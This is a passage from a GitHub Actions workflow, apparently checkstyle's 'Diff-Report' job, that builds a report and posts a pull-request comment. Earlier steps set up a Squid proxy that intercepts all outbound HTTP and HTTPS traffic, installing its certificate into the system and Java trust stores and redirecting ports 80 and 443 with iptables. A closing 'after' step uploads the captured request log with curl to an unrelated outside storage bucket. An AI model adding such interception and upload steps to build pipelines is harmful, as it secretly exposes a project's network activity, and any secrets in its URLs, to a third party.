        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      env:
        MSG: ${{ needs.make_report.outputs.message }}
      name: Get message
      run: "if [ -z \"$MSG\" ]; then\n  JOBS_LINK=\"https://github.com/checkstyle/checkstyle/actions/runs/${{github.run_id}}\"\
        \n  API_LINK=\"https://api.github.com/repos/checkstyle/checkstyle/actions/runs/\"\
        \n  API_LINK=\"${API_LINK}${{github.run_id}}/jobs\"\n  wget $API_LINK -O info.json\n\
        \  jq '.jobs' info.json > jobs\n  jq '.[] | select(.conclusion == \"failure\"\
        ) | .name' jobs > job_name\n  jq '.[] | select(.conclusion == \"failure\"\
        ) | .steps' jobs > steps\n  jq '.[] | select(.conclusion == \"failure\") |\
        \ .name' steps > step_name\n  echo \"Report generation job failed on phase\
        \ $(cat job_name),\" > message\n  echo \"step $(cat step_name).<br>Link: $JOBS_LINK\"\
        \ >> message\nelse  \n  echo \"$MSG\" > message\nfi\n"
    - continue-on-error: true
      id: out
      name: Set message
      run: echo ::set-output name=message::$(cat message)
    - continue-on-error: true
      name: Comment PR
      uses: checkstyle/contribution/comment-action@master
      with:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        message: ${{steps.out.outputs.message}}
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/mofadeyunduo/checkstyle.$(date
        +%s)
    timeout-minutes: 60
name: Diff-Report
'on':
  workflow_dispatch: {}
permissions:
  contents: read
  pull-requests: write
